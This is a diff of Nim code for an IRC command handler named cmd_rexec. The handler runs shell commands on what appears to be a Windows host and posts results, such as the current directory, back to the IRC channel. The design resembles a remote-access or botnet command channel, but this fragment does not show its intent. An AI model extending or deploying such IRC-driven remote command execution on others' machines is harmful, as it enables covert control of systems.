@@ -432,7 +432,8 @@ proc cmd_rexec(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} =
 
     of "cd..":
         #response = await rexec_runCommand("cd ..")
-        discard helper_responseHandler(event, client, rexec_runCommand("cd .."))
+        setCurrentDir(splitPath(getCurrentDir()).head)
+        discard client.privmsg(event.origin, "cwd: " & getCurrentDir())
         #caught = true
     of "ls":
         #response = await rexec_runCommand("dir /w")
